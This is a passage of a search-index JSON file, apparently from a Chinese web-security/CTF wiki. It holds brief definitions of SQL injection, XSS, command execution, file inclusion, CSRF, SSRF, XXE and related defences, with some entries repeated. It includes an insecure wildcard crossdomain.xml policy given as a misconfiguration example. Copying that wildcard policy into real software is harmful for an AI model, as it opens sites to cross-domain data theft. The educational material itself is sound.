\u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668 VPS \u7684\u4ef7\u683c\u90fd\u4f4e\u4e8e\u865a\u62df\u673a VPS \u7684\u4ef7\u683c\u3002\n\n\n\u6761\u4ef6\u7ade\u4e89\n\n\n\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u5728\u5904\u7406\u4e0d\u540c\u7528\u6237\u7684\u8bf7\u6c42\u65f6\u662f\u5e76\u53d1\u8fdb\u884c\u7684\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u5e76\u53d1\u5904\u7406\u4e0d\u5f53\u6216\u76f8\u5173\u64cd\u4f5c\u903b\u8f91\u987a\u5e8f\u8bbe\u8ba1\u7684\u4e0d\u5408\u7406\u65f6\uff0c\u5c06\u4f1a\u5bfc\u81f4\u6b64\u7c7b\u95ee\u9898\u7684\u53d1\u751f\u3002\n\n\nXXE\n\n\nXXE Injection \u5373 XML External Entity Injection\uff0c\u4e5f\u5c31\u662f XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb.\u6f0f\u6d1e\u662f\u5728\u5bf9\u975e\u5b89\u5168\u7684\u5916\u90e8\u5b9e\u4f53\u6570\u636e\u8fdb\u2f8f\u884c\u5904\u7406\u65f6\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u3002\n\n\n\u5728 XML 1.0 \u6807\u51c6\u91cc\uff0cXML \u6587\u6863\u7ed3\u6784\u2fa5\u91cc\u5b9a\u4e49\u4e86\u5b9e\u4f53\uff08entity\uff09\u8fd9\u4e2a\u6982\u5ff5.\u5b9e\u4f53\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u5728\u6587\u6863\u4e2d\u8c03\u7528\uff0c\u5b9e\u4f53\u7684\u6807\u8bc6\u7b26\u53ef\u8bbf\u95ee\u672c\u5730\u6216\u8fdc\u7a0b\u5185\u5bb9.\u5982\u679c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5f15\u5165\u4e86\u300c\u6c61\u67d3\u300d\u6e90\uff0c\u5728\u5bf9 XML \u6587\u6863\u5904\u7406\u540e\u5219\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\u7b49\u5b89\u5168\u95ee\u9898\u3002\n\n\nXSCH\n\n\n\u7531\u4e8e\u7f51\u7ad9\u5f00\u53d1\u8005\u5728\u4f7f\u7528 Flash\u3001Silverlight \u7b49\u8fdb\u884c\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u7684\u758f\u5ffd\uff0c\u6ca1\u6709\u5bf9\u8de8\u57df\u7b56\u7565\u6587\u4ef6\uff08crossdomain.xml\uff09\u8fdb\u884c\u6b63\u786e\u7684\u914d\u7f6e\u5bfc\u81f4\u95ee\u9898\u4ea7\u751f\u3002 \u4f8b\u5982\uff1a\n\n\ncross-domain-policy\n\n    \nallow-access-from\n \ndomain=\n\u201c*\u201d/\n\n\n/cross-domain-policy\n\n\n\n\n\n\u56e0\u4e3a\u8de8\u57df\u7b56\u7565\u6587\u4ef6\u914d\u7f6e\u4e3a \n*\n\uff0c\u4e5f\u5c31\u6307\u4efb\u610f\u57df\u7684 Flash \u90fd\u53ef\u4ee5\u4e0e\u5b83\u4ea4\u4e92\uff0c\u5bfc\u81f4\u53ef\u4ee5\u53d1\u8d77\u8bf7\u6c42\u3001\u83b7\u53d6\u6570\u636e\u3002\n\n\n\u8d8a\u6743\uff08\u529f\u80fd\u7ea7\u8bbf\u95ee\u7f3a\u5931\uff09\n\n\n\u8d8a\u6743\u6f0f\u6d1e\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u5b83\u7684\u5a01\u80c1\u5728\u4e8e\u4e00\u4e2a\u8d26\u6237\u5373\u53ef\u63a7\u5236\u5168\u7ad9\u7528\u6237\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e9b\u6570\u636e\u4ec5\u9650\u4e8e\u5b58\u5728\u6f0f\u6d1e\u529f\u80fd\u5bf9\u5e94\u7684\u6570\u636e\u3002\u8d8a\u6743\u6f0f\u6d1e\u7684\u6210\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u8be2\u65f6\u5bf9\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u8fc7\u5206\u76f8\u4fe1\u800c\u9057\u6f0f\u4e86\u6743\u9650\u7684\u5224\u5b9a\u3002\u6240\u4ee5\u6d4b\u8bd5\u8d8a\u6743\u5c31\u662f\u548c\u5f00\u53d1\u4eba\u5458\u62fc\u7ec6\u5fc3\u7684\u8fc7\u7a0b\u3002\n\n\n\u654f\u611f\u4fe1\u606f\u6cc4\u9732\n\n\n\u654f\u611f\u4fe1\u606f\u6307\u4e0d\u4e3a\u516c\u4f17\u6240\u77e5\u6089\uff0c\u5177\u6709\u5b9e\u9645\u548c\u6f5c\u5728\u5229\u7528\u4ef7\u503c\uff0c\u4e22\u5931\u3001\u4e0d\u5f53\u4f7f\u7528\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u5bf9\u793e\u4f1a\u3001\u4f01\u4e1a\u6216\u4e2a\u4eba\u9020\u6210\u5371\u5bb3\u7684\u4fe1\u606f\u3002\u5305\u62ec\uff1a\u4e2a\u4eba\u9690\u79c1\u4fe1\u606f\u3001\u4e1a\u52a1\u7ecf\u8425\u4fe1\u606f\u3001\u8d22\u52a1\u4fe1\u606f\u3001\u4eba\u4e8b\u4fe1\u606f\u3001IT \u8fd0\u7ef4\u4fe1\u606f\u7b49\u3002\n\u6cc4\u9732\u9014\u5f84\u5305\u62ec Github\u3001\u767e\u5ea6\u6587\u5e93\u3001Google code\u3001\u7f51\u7ad9\u76ee\u5f55\u7b49\u3002\n\n\n\u9519\u8bef\u7684\u5b89\u5168\u914d\u7f6e\n\n\nSecurity Misconfiguration\uff1a\u6709\u65f6\u5019\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u906d\u53d7\u591a\u79cd\u653b\u51fb\u3002\u5728\u5df2\u7ecf\u90e8\u7f72\u7684\u5e94\u7528\u3001WEB \u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ee3\u7801\u5e93\u4ee5\u53ca\u6240\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u7684\u7ec4\u4ef6\u4e2d\uff0c\u90fd\u5e94\u8be5\u4f7f\u7528\u73b0\u6709\u7684\u6700\u4f73\u5b89\u5168\u914d\u7f6e\uff0c\u8fd9\u4e00\u70b9\u81f3\u5173\u91cd\u8981\u3002\n\n\nWAF\n\n\nWeb \u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1aWAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWEB \u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9 HTTP/HTTPS \u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3a WEB \u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002\n\n\nIDS\n\n\nIDS \u662f\u82f1\u6587 Intrusion Detection Systems \u7684\u7f29\u5199\uff0c\u4e2d\u6587\u610f\u601d\u662f\u300c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u300d\u3002\u4e13\u4e1a\u4e0a\u8bb2\u5c31\u662f\u4f9d\u7167\u4e00\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u901a\u8fc7\u8f6f\u3001\u786c\u4ef6\uff0c\u5bf9\u7f51\u7edc\u3001\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u51b5\u8fdb\u884c\u76d1\u89c6\uff0c\u5c3d\u53ef\u80fd\u53d1\u73b0\u5404\u79cd\u653b\u51fb\u4f01\u56fe\u3001\u653b\u51fb\u884c\u4e3a\u6216\u8005\u653b\u51fb\u7ed3\u679c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u7edc\u7cfb\u7edf\u8d44\u6e90\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u3002\u505a\u4e00\u4e2a\u5f62\u8c61\u7684\u6bd4\u55bb\uff1a\u5047\u5982\u9632\u706b\u5899\u662f\u4e00\u5e62\u5927\u697c\u7684\u95e8\u9501\uff0c\u90a3\u4e48 IDS \u5c31\u662f\u8fd9\u5e62\u5927\u697c\u91cc\u7684\u76d1\u89c6\u7cfb\u7edf\u3002\u4e00\u65e6\u5c0f\u5077\u722c\u7a97\u8fdb\u5165\u5927\u697c\uff0c\u6216\u5185\u90e8\u4eba\u5458\u6709\u8d8a\u754c\u884c\u4e3a\uff0c\u53ea\u6709\u5b9e\u65f6\u76d1\u89c6\u7cfb\u7edf\u624d\u80fd\u53d1\u73b0\u60c5\u51b5\u5e76\u53d1\u51fa\u8b66\u544a\u3002\n\n\nIPS\n\n\n\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff1aIntrusion Prevention System\uff09\u662f\u7535\u8111\u7f51\u7edc\u5b89\u5168\u8bbe\u65bd\uff0c\u662f\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff08Antivirus Programs\uff09\u548c\u9632\u706b\u5899\uff08Packet Filter\uff0cApplication Gateway\uff09\u7684\u8865\u5145\u3002\u5165\u4fb5\u9884\u9632\u7cfb\u7edf\uff08Intrusion-prevention system\uff09\u662f\u4e00\u90e8\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6216\u7f51\u7edc\u8bbe\u5907\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u80fd\u591f\u5373\u65f6\u7684\u4e2d\u65ad\u3001\u8c03\u6574\u6216\u9694\u79bb\u4e00\u4e9b\u4e0d\u6b63\u5e38\u6216\u662f\u5177\u6709\u4f24\u5bb3\u6027\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u3002\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nWEB \u6e17\u900f Wiki", 
            "title": "Web \u5e94\u7528\u7b80\u4ecb"
        }, 
        {
            "location": "/web/introduction/#sql", 
            "text": "\u901a\u8fc7\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\u4e2d\u6ce8\u5165 SQL \u8bed\u6cd5\uff0c\u7834\u574f\u539f\u6709 SQL \u7ed3\u6784\uff0c\u8fbe\u5230\u7f16\u5199\u7a0b\u5e8f\u65f6\u610f\u6599\u4e4b\u5916\u7ed3\u679c\u7684\u653b\u51fb\u884c\u4e3a\u3002\u5176\u6210\u56e0\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e24\u4e2a\u539f\u56e0\u53e0\u52a0\u9020\u6210\u7684\uff1a   \u7a0b\u5e8f\u7f16\u5199\u8005\u5728\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u548c\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\uff0c\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020 SQL \u8bed\u53e5  \u672a\u5bf9\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\u4fbf\u5c06\u53c2\u6570\u5185\u5bb9\u62fc\u63a5\u8fdb\u5165\u5230 SQL \u8bed\u53e5\u4e2d", 
            "title": "SQL \u6ce8\u5165"
        }, 
        {
            "location": "/web/introduction/#xss", 
            "text": "\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002\u6076\u610f\u653b\u51fb\u8005\u5f80 WEB \u9875\u9762\u91cc\u63d2\u5165\u6076\u610f HTML \u4ee3\u7801\uff0c\u5f53\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u4e4b\u65f6\uff0c\u5d4c\u5165\u5176\u4e2d Web \u91cc\u9762\u7684 HTML \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u7279\u6b8a\u76ee\u7684\u3002", 
            "title": "XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb"
        }, 
        {
            "location": "/web/introduction/#_1", 
            "text": "\u5f53\u5e94\u7528\u9700\u8981\u8c03\u7528\u4e00\u4e9b\u5916\u90e8\u7a0b\u5e8f\u53bb\u5904\u7406\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4f1a\u7528\u5230\u4e00\u4e9b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\u3002\u5982 PHP \u4e2d\u7684  system \u3001 exec \u3001 shell_exec  \u7b49\uff0c\u5f53\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\uff0c\u5c06\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u5230\u6b63\u5e38\u547d\u4ee4\u4e2d\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u8fd8\u662f\u4e3b\u8981\u4ee5 PHP \u4e3a\u4e3b\u4ecb\u7ecd\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0cJava \u7b49\u5e94\u7528\u7684\u7ec6\u8282\u5f85\u8865\u5145\u3002", 
            "title": "\u547d\u4ee4\u6267\u884c"
        }, 
        {
            "location": "/web/introduction/#_2", 
            "text": "\u5982\u679c\u5141\u8bb8\u5ba2\u6237\u7aef\u7528\u6237\u8f93\u5165\u63a7\u5236\u52a8\u6001\u5305\u542b\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u53ca\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u4e3b\u8981\u5305\u62ec\u672c\u5730\u6587\u4ef6\u5305\u542b\u548c\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u4e24\u79cd\u5f62\u5f0f\u3002", 
            "title": "\u6587\u4ef6\u5305\u542b"
        }, 
        {
            "location": "/web/introduction/#csrf", 
            "text": "\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0cCSRF\uff09\u662f\u4e00\u79cd\u4f7f\u5df2\u767b\u5f55\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u67d0\u79cd\u52a8\u4f5c\u7684\u653b\u51fb\u3002\u56e0\u4e3a\u653b\u51fb\u8005\u770b\u4e0d\u5230\u4f2a\u9020\u8bf7\u6c42\u7684\u54cd\u5e94\u7ed3\u679c\uff0c\u6240\u4ee5 CSRF \u653b\u51fb\u4e3b\u8981\u7528\u6765\u6267\u884c\u52a8\u4f5c\uff0c\u800c\u975e\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002\u5f53\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u666e\u901a\u7528\u6237\u65f6\uff0cCSRF \u53ef\u4ee5\u5b9e\u73b0\u5728\u5176\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u8f6c\u79fb\u7528\u6237\u8d44\u91d1\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\u64cd\u4f5c\uff1b\u4f46\u662f\u5982\u679c\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7528\u6237\u65f6 CSRF \u5219\u53ef\u80fd\u5a01\u80c1\u5230\u6574\u4e2a WEB \u7cfb\u7edf\u7684\u5b89\u5168\u3002", 
            "title": "CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"
        }, 
        {
            "location": "/web/introduction/#ssrf", 
            "text": "SSRF\uff08Server-Side Request Forgery\uff1a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002", 
            "title": "SSRF \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020"
        }, 
        {
            "location": "/web/introduction/#_3", 
            "text": "\u5728\u7f51\u7ad9\u7684\u8fd0\u8425\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u8981\u5bf9\u7f51\u7ad9\u7684\u67d0\u4e9b\u9875\u9762\u6216\u8005\u5185\u5bb9\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u65f6\u4fbf\u9700\u8981\u4f7f\u7528\u5230\u7f51\u7ad9\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u5982\u679c\u4e0d\u5bf9\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236\u6216\u8005\u9650\u5236\u88ab\u7ed5\u8fc7\uff0c\u8be5\u529f\u80fd\u4fbf\u6709\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u4e8e\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u3001\u811a\u672c\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u8fdb\u800c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u670d\u52a1\u5668\u6ca6\u9677\u3002", 
            "title": "\u6587\u4ef6\u4e0a\u4f20"
        }, 
        {
            "location": "/web/introduction/#_4", 
            "text": "Clickjacking\uff08\u70b9\u51fb\u52ab\u6301\uff09\u662f\u7531\u4e92\u8054\u7f51\u5b89\u5168\u4e13\u5bb6\u7f57\u4f2f\u7279\u00b7\u6c49\u68ee\u548c\u8036\u5229\u7c73\u00b7\u683c\u52b3\u65af\u66fc\u5728 2008 \u5e74\u9996\u521b\u7684\u3002  \u662f\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u624b\u6bb5\uff0c\u5728 WEB \u7aef\u5c31\u662f iframe \u5d4c\u5957\u4e00\u4e2a\u900f\u660e\u4e0d\u53ef\u89c1\u7684\u9875\u9762\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u653b\u51fb\u8005\u60f3\u8981\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u7684\u4f4d\u7f6e\u3002  \u7531\u4e8e\u70b9\u51fb\u52ab\u6301\u7684\u51fa\u73b0\uff0c\u4fbf\u51fa\u73b0\u4e86\u53cd frame \u5d4c\u5957\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u70b9\u51fb\u52ab\u6301\u9700\u8981 iframe \u5d4c\u5957\u9875\u9762\u6765\u653b\u51fb\u3002  \u4e0b\u9762\u4ee3\u7801\u662f\u6700\u5e38\u89c1\u7684\u9632\u6b62 frame \u5d4c\u5957\u7684\u4f8b\u5b50\uff1a  if ( top . location != location ) \n     top . location = self . location ;", 
            "title": "\u70b9\u51fb\u52ab\u6301"
        }, 
        {
            "location": "/web/introduction/#vps", 
            "text": "VPS\uff08Virtual Private Server \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u6280\u672f\uff0c\u5c06\u4e00\u90e8\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u4f18\u8d28\u670d\u52a1\u3002\u5b9e\u73b0 VPS \u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\uff0c\u548c\u865a\u62df\u5316\u6280\u672f\u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2a VPS \u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51 IP \u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540c VPS \u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU \u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u72ec\u5360\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS \u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS \u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e IDC \u8d44\u6e90\u79df\u7528\u3002  IDC \u8d44\u6e90\u79df\u7528\uff0c\u7531 VPS \u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540c VPS \u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6 VPS \u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS \u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662f VPS \u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS \u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668 VPS \u7684\u4ef7\u683c\u90fd\u4f4e\u4e8e\u865a\u62df\u673a VPS \u7684\u4ef7\u683c\u3002", 
            "title": "VPS \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668"
        }, 
        {
            "location": "/web/introduction/#_5", 
            "text": "\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u5728\u5904\u7406\u4e0d\u540c\u7528\u6237\u7684\u8bf7\u6c42\u65f6\u662f\u5e76\u53d1\u8fdb\u884c\u7684\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u5e76\u53d1\u5904\u7406\u4e0d\u5f53\u6216\u76f8\u5173\u64cd\u4f5c\u903b\u8f91\u987a\u5e8f\u8bbe\u8ba1\u7684\u4e0d\u5408\u7406\u65f6\uff0c\u5c06\u4f1a\u5bfc\u81f4\u6b64\u7c7b\u95ee\u9898\u7684\u53d1\u751f\u3002", 
            "title": "\u6761\u4ef6\u7ade\u4e89"
        }, 
        {
            "location": "/web/introduction/#xxe", 
            "text": "XXE Injection \u5373 XML External Entity Injection\uff0c\u4e5f\u5c31\u662f XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb.\u6f0f\u6d1e\u662f\u5728\u5bf9\u975e\u5b89\u5168\u7684\u5916\u90e8\u5b9e\u4f53\u6570\u636e\u8fdb\u2f8f\u884c\u5904\u7406\u65f6\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u3002  \u5728 XML 1.0 \u6807\u51c6\u91cc\uff0cXML \u6587\u6863\u7ed3\u6784\u2fa5\u91cc\u5b9a\u4e49\u4e86\u5b9e\u4f53\uff08entity\uff09\u8fd9\u4e2a\u6982\u5ff5.\u5b9e\u4f53\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u5728\u6587\u6863\u4e2d\u8c03\u7528\uff0c\u5b9e\u4f53\u7684\u6807\u8bc6\u7b26\u53ef\u8bbf\u95ee\u672c\u5730\u6216\u8fdc\u7a0b\u5185\u5bb9.\u5982\u679c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5f15\u5165\u4e86\u300c\u6c61\u67d3\u300d\u6e90\uff0c\u5728\u5bf9 XML \u6587\u6863\u5904\u7406\u540e\u5219\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\u7b49\u5b89\u5168\u95ee\u9898\u3002", 
            "title": "XXE"
        }, 
        {
            "location": "/web/introduction/#xsch", 
            "text": "\u7531\u4e8e\u7f51\u7ad9\u5f00\u53d1\u8005\u5728\u4f7f\u7528 Flash\u3001Silverlight \u7b49\u8fdb\u884c\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u7684\u758f\u5ffd\uff0c\u6ca1\u6709\u5bf9\u8de8\u57df\u7b56\u7565\u6587\u4ef6\uff08crossdomain.xml\uff09\u8fdb\u884c\u6b63\u786e\u7684\u914d\u7f6e\u5bfc\u81f4\u95ee\u9898\u4ea7\u751f\u3002 \u4f8b\u5982\uff1a  cross-domain-policy \n     allow-access-from   domain= \u201c*\u201d/  /cross-domain-policy   \u56e0\u4e3a\u8de8\u57df\u7b56\u7565\u6587\u4ef6\u914d\u7f6e\u4e3a  * \uff0c\u4e5f\u5c31\u6307\u4efb\u610f\u57df\u7684 Flash \u90fd\u53ef\u4ee5\u4e0e\u5b83\u4ea4\u4e92\uff0c\u5bfc\u81f4\u53ef\u4ee5\u53d1\u8d77\u8bf7\u6c42\u3001\u83b7\u53d6\u6570\u636e\u3002", 
            "title": "XSCH"
        }, 
        {
            "location": "/web/introduction/#_6", 
            "text": "\u8d8a\u6743\u6f0f\u6d1e\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u5b83\u7684\u5a01\u80c1\u5728\u4e8e\u4e00\u4e2a\u8d26\u6237\u5373\u53ef\u63a7\u5236\u5168\u7ad9\u7528\u6237\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e9b\u6570\u636e\u4ec5\u9650\u4e8e\u5b58\u5728\u6f0f\u6d1e\u529f\u80fd\u5bf9\u5e94\u7684\u6570\u636e\u3002\u8d8a\u6743\u6f0f\u6d1e\u7684\u6210\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u8be2\u65f6\u5bf9\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u8fc7\u5206\u76f8\u4fe1\u800c\u9057\u6f0f\u4e86\u6743\u9650\u7684\u5224\u5b9a\u3002\u6240\u4ee5\u6d4b\u8bd5\u8d8a\u6743\u5c31\u662f\u548c\u5f00\u53d1\u4eba\u5458\u62fc\u7ec6\u5fc3\u7684\u8fc7\u7a0b\u3002", 
